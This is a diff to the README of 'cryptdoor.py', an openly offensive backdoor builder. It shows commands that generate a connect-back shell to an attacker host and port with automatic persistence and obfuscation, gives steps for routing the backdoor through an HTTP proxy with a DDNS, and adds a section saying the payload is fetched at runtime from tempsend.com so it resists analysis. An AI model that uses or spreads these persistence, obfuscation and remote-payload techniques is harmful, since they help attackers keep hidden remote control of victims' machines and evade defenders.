@@ -67,10 +67,6 @@ You can add a -a to attempt automatic persistence and obfuscation with -o:
 
         ./cryptdoor.py -i host -p port -a -o
 
-If you want to be extra stealthy and mysterious, never have the backdoor code touch disk with -d:
-
-        ./cryptdoor.py -i host -p port -d -o
-
 host and port refer to the host and port of the listening server (attacker).
 These are the options you have from within the shell:
 
@@ -97,7 +93,7 @@ Proxies
 
 If you wish to have your backdoor connect back to you through a HTTP/s proxy, there a few things we have to do:
 
-1. Edit the stubs/backdoor.py script from line 312-313, and fill in the values for the proxy details.
+1. Edit the stubs/backdoor.py script from line 310-311, and fill in the values for the proxy details.
 
 2. Get a DDNS pointed at your IP (proxying will not work without one).
 
@@ -116,3 +112,8 @@ Obfuscation
 Obfuscation of the backdoor source code is acheived using:
 
 https://github.com/astrand/pyobfuscate
+
+Remote payload
+=========
+The backdoor payload is hosted on tempsend.com and downloaded at runtime by the backdoor.py  
+This means the actual backdoor code is not included in the final backdoor.py and is therefore resitant to analysis.
